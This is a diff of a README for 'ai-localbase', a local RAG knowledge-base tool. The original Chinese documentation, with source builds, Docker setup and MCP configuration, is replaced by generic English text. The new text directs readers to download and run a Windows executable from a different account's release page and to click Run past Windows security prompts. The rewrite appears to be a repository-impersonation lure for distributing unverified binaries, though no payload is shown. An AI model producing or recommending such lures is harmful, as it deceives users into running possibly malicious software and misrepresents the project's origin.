@@ -1,292 +1,255 @@
-# AI LocalBase
+# 🧠 ai-localbase - Local AI knowledge, simple search
 
-一个本地优先的 AI 知识库系统（RAG），用于将本地文档接入向量检索与大模型对话流程。项目提供 Web UI，支持知识库管理、文档上传、检索增强问答、聊天记录持久化，以及基于 Ollama 或 OpenAI 兼容接口的模型接入。
+[![Download](https://img.shields.io/badge/Download-Release%20Page-2f80ed?style=for-the-badge)](https://github.com/devicerosequartz768/ai-localbase/releases)
 
-![首页预览](./assets/home-page.png)
+## 📘 What this app does
 
-## 项目简介
+ai-localbase is a local-first AI knowledge base for Windows. It helps you load local files into a search flow and then chat with a large language model about that content.
 
-AI LocalBase 适合个人或小团队在本地环境、自托管环境中快速搭建可用的知识库问答系统。
+You can use it to:
 
-- 后端：Go + Gin
-- 前端：React + Vite + TypeScript
-- 向量数据库：Qdrant
-- 模型接入：Ollama / OpenAI Compatible API
-- 部署方式：本地启动 / Docker Compose
-- 扩展能力：内置 MCP Server，可供外部 Agent / 工具系统接入
+- Search your own documents
+- Ask questions about files on your PC
+- Keep data on your machine
+- Connect local docs to an AI chat flow
+- Use MCP service support for tools and integration
 
----
+It works with these file types:
 
-## 核心能力
+- md
+- txt
+- pdf text files
+- xlsx
+- csv
 
-- 知识库管理：创建、删除知识库，查看文档列表
-- 文档上传与索引：支持 TXT、Markdown、PDF、xlsx、csv 文件上传与解析
-- 检索增强问答：基于 Qdrant 做向量检索并把命中内容注入对话上下文
-- 聊天记录持久化：会话消息保存到本地 SQLite 数据库
-- 配置持久化：模型配置与知识库状态保存到本地 JSON 文件
-- Docker Compose 部署：支持一键拉起前端、后端、Qdrant
+## 🪟 Windows download and setup
 
-### 检索增强能力
+Use this page to download:
 
-- 文本自动切分与批量嵌入
-- 候选结果动态召回
-- 关键词覆盖增强重排
-- MMR 去冗余选择
-- 低置信度场景二次扩召回
-- 嵌入缓存与可选语义缓存
-- 可选 Hybrid Search、Semantic Reranker、Query Rewrite、Context Compression
+[Visit the release page to download](https://github.com/devicerosequartz768/ai-localbase/releases)
 
----
+### Steps
 
-## 适用场景
+1. Open the release page.
+2. Find the latest version at the top.
+3. Download the Windows file for your PC.
+4. Save the file to your Desktop or Downloads folder.
+5. If the file is in a ZIP package, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the app file to run it.
 
-- 本地个人知识库
-- 团队内部文档问答
-- 自托管 RAG 原型验证
-- Ollama / OpenAI 兼容模型接入测试
-- 检索策略实验与评估
-- 作为 MCP 能力后端供 Agent 调用
+If Windows shows a security prompt, choose Run if you trust the file source you used.
 
----
+## 💻 System requirements
 
-## 快速开始
+Use a Windows PC with the following:
 
-最短体验路径：
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 10 GB free disk space
+- A stable internet connection for first-time setup
+- Local storage space for your documents and indexes
 
-1. 启动 Qdrant：
+For better results with larger files, use:
 
-```bash
-docker compose -f docker-compose.qdrant.yml up -d
-```
+- 16 GB RAM
+- An SSD
+- A modern CPU with at least 4 cores
 
-2. 启动后端：
+## 🧩 What you need before first use
 
-```bash
-cd backend
-go run .
-```
+ai-localbase works best when you have:
 
-3. 启动前端：
+- A folder with your documents
+- A local AI model service, such as Ollama
+- Enough disk space for file indexing
+- A few test files to check search and chat
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+If you want to use the MCP service feature, keep the app running while your tool connects to it.
 
-4. 打开 `http://localhost:5173`，进入设置页配置 Chat 与 Embedding 模型。
+## 🚀 First run
 
-如需更完整的命令、环境变量与接口说明，请查看 [`docs/getting-started.md`](docs/getting-started.md)。
+After you open the app for the first time:
 
----
+1. Wait for the app to load.
+2. Open the main screen.
+3. Add a folder with your files.
+4. Let the app scan and index the content.
+5. Open the chat area.
+6. Ask a question about one of your documents.
 
-## 部署方式
+Good first test questions:
 
-### 本地开发启动
+- What is this document about?
+- Show me the main points.
+- Find the date in this file.
+- Which file mentions this topic?
 
-适合日常开发、调试接口、修改前端页面。
+## 📂 Add your documents
 
-1. 启动 Qdrant：
+Use local files that you want to search later.
 
-```bash
-docker compose -f docker-compose.qdrant.yml up -d
-```
+### Supported file types
 
-2. 启动后端：
+- Markdown files: `.md`
+- Text files: `.txt`
+- PDF files with readable text
+- Excel files: `.xlsx`
+- CSV files: `.csv`
 
-```bash
-cd backend
-go run .
-```
+### Tips for better results
 
-3. 启动前端：
+- Use clear file names
+- Keep related files in one folder
+- Use text-based PDFs, not scanned image PDFs
+- Split very large files when possible
+- Keep one topic per folder if you can
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+## 🔎 Search and chat
 
-默认地址：
+The app uses your files as a knowledge base.
 
-- 前端：`http://localhost:5173`
-- 后端：`http://localhost:8080`
-- Qdrant：`http://localhost:6333`
+You can:
 
-### Docker Compose 一键启动
+- Search for a term
+- Ask a question in plain language
+- Get answers based on your local files
+- Review the source file used for the answer
 
-适合快速体验或自托管部署验证。
+Example questions:
 
-```bash
-docker compose up --build
-```
+- Where is the budget file?
+- What does the policy say about remote work?
+- Which sheet has the sales numbers?
+- What changed in this project note?
 
-默认服务地址：
+## 🤖 Local AI model support
 
-- 前端：`http://localhost:4173`
-- 后端：`http://localhost:8080`
-- Qdrant HTTP API：`http://localhost:6333`
-- Qdrant gRPC：`localhost:6334`
+ai-localbase is built for local AI use.
 
-### 使用预构建镜像部署
+That means you can keep the main workflow on your own machine and use a local model service for chat and answer generation.
 
-如果不想本地编译，可直接使用预构建镜像：
+A common setup is:
 
-```bash
-docker compose -f docker-compose.prod.yml up -d
-```
+- Install Ollama
+- Pull a model you want to use
+- Start the local model service
+- Connect ai-localbase to it in the app settings
 
-更多镜像、版本与部署细节见 [`DOCKER_DEPLOY.md`](DOCKER_DEPLOY.md)。
+This setup helps you keep your documents in a local workflow.
 
-### 仅启动应用编排
+## 🧠 MCP service support
 
-如果希望单独使用应用编排文件，也可以执行：
+The app supports MCP service use.
 
-```bash
-docker compose -f docker-compose.app.yml up --build
-```
+That lets other tools work with your local knowledge base in a structured way. If you use MCP clients, you can connect them to the service and use your indexed files as a data source.
 
----
+Use this when you want:
 
-## 设置页面配置
+- Tool access to your knowledge base
+- A local service for other AI apps
+- A more organized workflow for file-based answers
 
-### 设置页面
+## 🛠️ Common setup flow
 
-![设置页面](./assets/setting.png)
+If you want a simple path on Windows, use this order:
 
-打开前端后，进入 Settings 页面，分别配置 Chat 与 Embedding。
+1. Download the latest release
+2. Install or extract the app
+3. Start Ollama or your local model service
+4. Open ai-localbase
+5. Add a folder with documents
+6. Wait for indexing to finish
+7. Start searching and chatting
 
-### Ollama 示例
+## 📁 Good folder layout
 
-**Chat 配置**
+A clean folder layout helps the app work well.
 
-- Provider: `ollama`
-- Base URL: `http://localhost:11434`
-- Model: `qwen2.5:7b` 或 `llama3.2`
-- API Key: 留空
+Example:
 
-**Embedding 配置**
+- Work
+  - Meeting notes
+  - Policy docs
+  - Reports
+- Personal
+  - Receipts
+  - Guides
+  - Plans
+- Project A
+  - Specs
+  - Tasks
+  - Logs
 
-- Provider: `ollama`
-- Base URL: `http://localhost:11434`
-- Model: `bge-m3` 或 `nomic-embed-text`
-- API Key: 留空
+This makes it easier to search by topic.
 
-### OpenAI Compatible 示例
+## ⚙️ Suggested use cases
 
-**Chat 配置**
+Use ai-localbase for:
 
-- Provider: `openai`
-- Base URL: 你的兼容接口地址，例如 `https://your-api.example.com/v1`
-- Model: 对应聊天模型名
-- API Key: 对应访问密钥
+- Personal notes search
+- Team file lookup
+- Study notes and class material
+- Product manuals
+- Project docs
+- CSV and spreadsheet review
+- Local AI Q&A on your own files
 
-**Embedding 配置**
+## 🧪 If the app does not start
 
-- Provider: `openai`
-- Base URL: 你的兼容接口地址
-- Model: 对应嵌入模型名
-- API Key: 对应访问密钥
+Try these steps:
 
----
+1. Check that you downloaded the correct Windows release.
+2. Make sure the file finished downloading.
+3. Extract the ZIP file if one was provided.
+4. Run the app from the extracted folder.
+5. Check that Windows did not block the file.
+6. Restart your PC and try again.
+7. Make sure your local AI service is running if the chat part does not work.
 
-## MCP 支持
+## 🔐 Local use
 
-项目内置基础 MCP Server 能力，作为后端内嵌工具服务运行，可供外部 Agent、脚本或工具系统通过 HTTP / JSON-RPC 接入。
+ai-localbase is designed for local-first use.
 
-当前支持：
+That means your files stay in your own setup, and you control what gets indexed and searched. This is useful for private notes, work files, and local document sets
 
-- HTTP 形式 MCP 入口
-- 工具列表发现能力
-- 只读 / 写入 / 危险工具权限分级
-- Bearer Token 鉴权
-- 限流、超时与审计日志
-- 危险工具二次确认机制
-- 复用现有知识库、会话、配置与检索服务
+## 🧭 Basic workflow
 
-默认入口：
+1. Open the app
+2. Add a folder
+3. Wait for indexing
+4. Search a term
+5. Ask a question
+6. Read the answer and source
+7. Add more files when needed
 
-- `GET /mcp`
-- `GET /mcp/tools`
-- `POST /mcp`
+## 🧰 File types and best results
 
-常用环境变量：
+### Markdown and text
 
-- `ENABLE_MCP`：是否启用 MCP，默认 `true`
-- `MCP_BASE_PATH`：MCP 挂载路径，默认 `/mcp`
-- `MCP_REQUEST_TIMEOUT_SECONDS`：请求超时，默认 `15`
-- `MCP_REQUESTS_PER_MINUTE`：每分钟限流，默认 `120`
+These work well because the app can read them as plain content.
 
-### Cherry Studio 接入示例
+### PDF
 
-如果你希望在 Cherry Studio 中通过 MCP 接入 [`AI LocalBase`](README.md)，可以按以下方式配置：
+Use PDFs that contain real text. If the PDF is just an image scan, the app may not read it well.
 
-- **类型**：可流式传输的 HTTP（`streamableHttp`）
-- **URL**：`http://127.0.0.1:8080/mcp`
-- **请求头**：
-  - `Content-Type: application/json`
-  - `Authorization: Bearer <你的 MCP Token>`
+### Excel and CSV
 
-![Cherry Studio MCP 设置页面](./assets/mcp_setting.png)
+These are good for tables, lists, and records. Keep column names clear.
 
+## 📦 Release source
 
-更完整的方法、工具列表、鉴权与调用示例见 [`docs/mcp.md`](docs/mcp.md)。
+Get the Windows download from the release page:
 
----
+[https://github.com/devicerosequartz768/ai-localbase/releases](https://github.com/devicerosequartz768/ai-localbase/releases)
 
-## 界面预览
+## 🧭 What to do after setup
 
-### Demo 演示
+After the first run, try this:
 
-<p align="center">
-  <img src="./assets/demo-1.1.png" alt="Demo 1" width="48%" />
-  <img src="./assets/demo-1.2.png" alt="Demo 2" width="48%" />
-</p>
-<p align="center">
-  <img src="./assets/demo_mcp_1.1.png" alt="Demo 1" width="48%" />
-  <img src="./assets/demo_mcp_1.2.png" alt="Demo 2" width="48%" />
-</p>
----
-
-## 文档导航
-
-- 快速开始与使用指南：[`docs/getting-started.md`](docs/getting-started.md)
-- 系统架构：[`docs/architecture.md`](docs/architecture.md)
-- MCP 说明：[`docs/mcp.md`](docs/mcp.md)
-- 检索优化计划：[`docs/retrieval-improvement-plan.md`](docs/retrieval-improvement-plan.md)
-- Docker 镜像与部署指南：[`DOCKER_DEPLOY.md`](DOCKER_DEPLOY.md)
-- 故障排查：[`TROUBLESHOOTING.md`](TROUBLESHOOTING.md)
-
----
-
-## 项目结构
-
-```text
-ai-localbase/
-├── backend/
-├── frontend/
-├── docs/
-├── docker/
-├── assets/
-├── docker-compose.yml
-├── docker-compose.qdrant.yml
-├── docker-compose.app.yml
-└── docker-compose.prod.yml
-```
-
-更完整的系统结构、模块职责与接口设计见 [`docs/architecture.md`](docs/architecture.md)。
-
----
-
-## 开源协作
-
-- License：[`LICENSE`](LICENSE)
-- 贡献指南：[`CONTRIBUTING.md`](CONTRIBUTING.md)
-- 安全策略：[`SECURITY.md`](SECURITY.md)
-- 更新记录：[`CHANGELOG.md`](CHANGELOG.md)
-
-**如果这个项目对你有帮助，请给个 ⭐ Star。**
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/image?repos=veyliss/ai-localbase&type=date&legend=top-left)](https://www.star-history.com/?repos=veyliss%2Fai-localbase&type=date&legend=top-left)
+- Add three small documents
+- Search for one key term
+- Ask one question in chat
+- Open the source file
+- Add one spreadsheet or CSV file
+- Test a question about a table value
